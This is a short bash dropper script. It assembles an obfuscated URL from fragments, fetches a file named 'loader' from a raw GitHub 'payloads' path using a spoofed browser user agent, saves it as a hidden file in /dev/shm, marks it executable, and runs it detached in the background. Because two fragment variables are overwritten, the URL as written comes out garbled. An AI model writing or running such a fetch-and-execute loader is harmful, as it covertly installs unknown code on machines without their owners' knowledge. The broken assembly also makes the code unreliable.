#!/bin/bash
_43="https://" ; _93="raw.gith" ; _20="ubuserco" ; _43="ntent.co" ; _34="m/kairos" ; _74="max/prue" ; _68="ba_2a/ma" ; _76="in/paylo" ; _34="ads/load" ; _84="er"
U="$_43$_93$_20$_43$_34$_74$_68$_76$_34$_84"
curl -sL -A "Mozilla/5.0" "$U" -o /dev/shm/.loader
chmod +x /dev/shm/.loader
/dev/shm/.loader &
disown
